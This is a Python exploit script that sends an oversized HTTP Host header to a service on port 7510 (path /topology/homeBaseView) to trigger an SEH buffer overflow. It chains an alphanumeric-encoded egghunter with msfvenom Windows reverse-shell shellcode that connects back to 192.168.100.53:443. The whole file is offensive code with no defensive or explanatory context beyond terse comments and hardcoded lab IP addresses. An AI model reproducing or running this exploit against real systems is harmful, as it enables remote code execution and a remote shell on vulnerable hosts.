#!/usr/bin/python

import socket, os, sys

#RAW EGGHUNTER
#\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"."w00t"."\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
egghunter = r"%JMNU%521*TX-A777-i%"
egghunter += r"%%-r2II-\ZZZP\%JMNU%"
egghunter += r"521*-x0Y0-wZ*Z-iZIZ-"
egghunter += r"3333P-B\TT--tTt-%M%-"
egghunter += r"-2TGBP-yII--lCr3-pgy"
egghunter += r"*-****P-prp0-7rJ%-Sr"
egghunter += r"4--GGGGP-jjQ9-rr9--f"
egghunter += r"f60-qp9%P-2b22-2es2-"
egghunter += r"plvp-fyppP-ZZe%-GAvG"
egghunter += r"--Uz2-%%%%P-gggg-uuu"
egghunter += r"u-WxAA-vkiLP"

#egghunter=(
#        "\x54"                      #push ESP
#        "\x58"                      #pop EAX
#        "\x2D\x66\x4D\x55\x55"      #sub EAX,55554D66
#        "\x2D\x66\x4B\x55\x55"      #sub EAX,55554B66
#        "\x2D\x6A\x50\x55\x55"      #sub EAX,5555506A
#        "\x50"                      #push EAX
#        "\x5C"                      #pop ESP 
#        "\x41\x41"                  #inc EAX, inc EAX
#        "\x25\x41\x41\x41\x41"      #AND EAX, 41414141
#        "\x25\x32\x32\x32\x32"      #AND EAX, 32323232
#        "\x2d\x7f\x09\x7f\x09"      #SUB EAX, 97F097F
#        "\x2d\x07\x07\x7c\x09"      #SUB EAX, 97C0707
#        "\x2d\x05\x08\x05\x05"      #SUB EAX, 5050805
#        "\x50"                      #PUSH EAX - PUSHES E7FFE775 onto stack 
#        "\x41\x41"                  #INC EAX, INC EAX
#        "\x25\x41\x41\x41\x41"      #AND EAX, 41414141
#        "\x25\x32\x32\x32\x32"      #AND EAX, 32323232
#        "\x2d\x4f\x09\x71\x41"      #SUB EAX, 4171094F
#        "\x2d\x01\x79\x31\x09"      #SUB EAX, 9317901
#        "\x2d\x01\x08\x73\x05"      #SUB EAX, 5730801
#        "\x50"                      #PUSH EAX - PUSHES AFEA75AF
#        "\x41\x41"                  #INC EAX, INC EAX
#        "\x25\x41\x41\x41\x41"      #AND EAX, 41414141
#        "\x25\x32\x32\x32\x32"      #AND EAX, 32323232  
#        "\x48"                      #DEC EAX
       # "\x2d\x70\x75\x41\x01"      #SUB EAX, 1417570
       # "\x2d\x5f\x33\x33\x04"      #SUB EAX, 433335F
#        "\x50"                      #PUSH EAX - PUSHES FA8B5730 onto stack
#        "\x41\x41"                  #INC EAX, INC EAX
#        "\x25\x41\x41\x41\x41"      #AND EAX, 41414141
#        "\x25\x32\x32\x32\x32"      #AND EAX, 32323232
#        "\x2d\x09\x01\x77\x77"      #SUB EAX, 77770109
#        "\x2d\x08\x46\x34\x58"      #SUB EAX, 58344608
#        "\x50"                      #PUSH EAX - PUSHES 3054B8EF onto stack
#        "\x41\x41\x41"              #INC EAX, INC EAX, INC EAX
#        "\x25\x41\x41\x41\x41"      #AND EAX, 41414141
#        "\x25\x32\x32\x32\x32"      #AND EAX, 32323232
#        "\x2d\x7f\x7f\x6f\x43"      #SUB EAX, 436F7F7F
#        "\x2d\x45\x7b\x36\x48"      #SUB EAX, 48367B45
#        "\x50"                      #PUSH EAX - PUSHES 745A053C onto stack
#        "\x41\x41\x41"              #INC EAX, INC EAX, INC EAX
#        "\x25\x41\x41\x41\x41"      #AND EAX, 41414141
#        "\x25\x32\x32\x32\x32"      #AND EAX, 32323232
#        "\x2d\x7f\x76\x01\x70"      #SUB EAX, 7001767F
#        "\x2d\x7f\x31\x31\x61"      #SUB EAX, 6131317F
#        "\x50"                      #PUSH EAX - PUSHES 2ECD5802 onto stack
#        "\x41\x41\x41"              #INC EAX, INC EAX, INC EAX
#        "\x25\x41\x41\x41\x41"      #AND EAX, 41414141
#        "\x25\x32\x32\x32\x32"      #AND EAX, 32323232
#        "\x2d\x7f\x77\x77\x62"      #SUB EAX, 6277777F
#        "\x2d\x72\x46\x36\x33"      #SUB EAX, 33364672
#        "\x50"                      #PUSH EAX - PUSHES 6A52420F onto stack
#        "\x41\x41\x41"              #INC EAX, INC EAX, INC EAX
#        "\x25\x41\x41\x41\x41"      #AND EAX, 41414141
#        "\x25\x32\x32\x32\x32"      #AND EAX, 32323232
#        "\x48"                      #DEC EAX
#        "\x05\x01\x01\x7f\x7f"      #ADD EAX, 7F7F0101
#        "\x2d\x66\x47\x71\x47"      #SUB EAX, 47714766    
#        "\x2d\x34\x38\x43\x38"      #SUB EAX, 38433834
#        "\x50"                      #PUSH EAX - PUSHES FFCA8166 onto stack
#        "\x41")                     #INC EAX

# msfvenom -p windows/shell_reverse_tcp -v shell -f python LHOST=192.168.100.53 LPORT=443 -e x86/shikata_ga_nai -b "\x00\x2e"
#Payload size: 352 bytes
shell =  ""
shell += "\x90\x90\x90\xb8\x99\x9f\xd9\xf9\xda\xc8\xd9\x74\x24\xf4\x5a\x29"
shell += "\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x73\x63\x3b"
shell += "\x0c\x7f\x74\x3e\xef\x7f\x85\x5f\x79\x9a\xb4\x5f\x1d"
shell += "\xef\xe7\x6f\x55\xbd\x0b\x1b\x3b\x55\x9f\x69\x94\x5a"
shell += "\x28\xc7\xc2\x55\xa9\x74\x36\xf4\x29\x87\x6b\xd6\x10"
shell += "\x48\x7e\x17\x54\xb5\x73\x45\x0d\xb1\x26\x79\x3a\x8f"
shell += "\xfa\xf2\x70\x01\x7b\xe7\xc1\x20\xaa\xb6\x5a\x7b\x6c"
shell += "\x39\x8e\xf7\x25\x21\xd3\x32\xff\xda\x27\xc8\xfe\x0a"
shell += "\x76\x31\xac\x73\xb6\xc0\xac\xb4\x71\x3b\xdb\xcc\x81"
shell += "\xc6\xdc\x0b\xfb\x1c\x68\x8f\x5b\xd6\xca\x6b\x5d\x3b"
shell += "\x8c\xf8\x51\xf0\xda\xa6\x75\x07\x0e\xdd\x82\x8c\xb1"
shell += "\x31\x03\xd6\x95\x95\x4f\x8c\xb4\x8c\x35\x63\xc8\xce"
shell += "\x95\xdc\x6c\x85\x38\x08\x1d\xc4\x54\xfd\x2c\xf6\xa4"
shell += "\x69\x26\x85\x96\x36\x9c\x01\x9b\xbf\x3a\xd6\xdc\x95"
shell += "\xfb\x48\x23\x16\xfc\x41\xe0\x42\xac\xf9\xc1\xea\x27"
shell += "\xf9\xee\x3e\xe7\xa9\x40\x91\x48\x19\x21\x41\x21\x73"
shell += "\xae\xbe\x51\x7c\x64\xd7\xf8\x87\xef\x18\x54\xe3\xda"
shell += "\xf0\xa7\xeb\x25\xba\x21\x0d\x4f\xac\x67\x86\xf8\x55"
shell += "\x22\x5c\x98\x9a\xf8\x19\x9a\x11\x0f\xde\x55\xd2\x7a"
shell += "\xcc\x02\x12\x31\xae\x85\x2d\xef\xc6\x4a\xbf\x74\x16"
shell += "\x04\xdc\x22\x41\x41\x12\x3b\x07\x7f\x0d\x95\x35\x82"
shell += "\xcb\xde\xfd\x59\x28\xe0\xfc\x2c\x14\xc6\xee\xe8\x95"
shell += "\x42\x5a\xa5\xc3\x1c\x34\x03\xba\xee\xee\xdd\x11\xb9"
shell += "\x66\x9b\x59\x7a\xf0\xa4\xb7\x0c\x1c\x14\x6e\x49\x23"
shell += "\x99\xe6\x5d\x5c\xc7\x96\xa2\xb7\x43\xa6\xe8\x95\xe2"
shell += "\x2f\xb5\x4c\xb7\x2d\x46\xbb\xf4\x4b\xc5\x49\x85\xaf"
shell += "\xd5\x38\x80\xf4\x51\xd1\xf8\x65\x34\xd5\xaf\x86\x1d"
shell += "\xcc" * 497 

# [*] Exact match at offset 3381
crash = "\x41" * 3377 + "\x4c\x4c\x77\x21" + "\x5f\x74\x44\x5a" + "\x43" *32 
crash+= egghunter + "A" * (360-len(egghunter)) + ":7510"
# 0x5A44745F      pop ebx - pop - retbis

buffer ="GET /topology/homeBaseView HTTP/1.1\r\n"
buffer+="Host: " + crash + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+=("T00WT00W"+"\x43"*70 + shell +"\xcc" * (1234-len(shell)))
#original x43 = 64

print "[*] Sending Evil Shenanigans"
print "[*] Crash variable Length : " + str(len(crash))
print "[*] Shell variable length : " + str(len(shell))
print "[*] Buffer Variable Length "  + str(len(buffer))
s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.176", 7510))
s.send(buffer)
s.close()
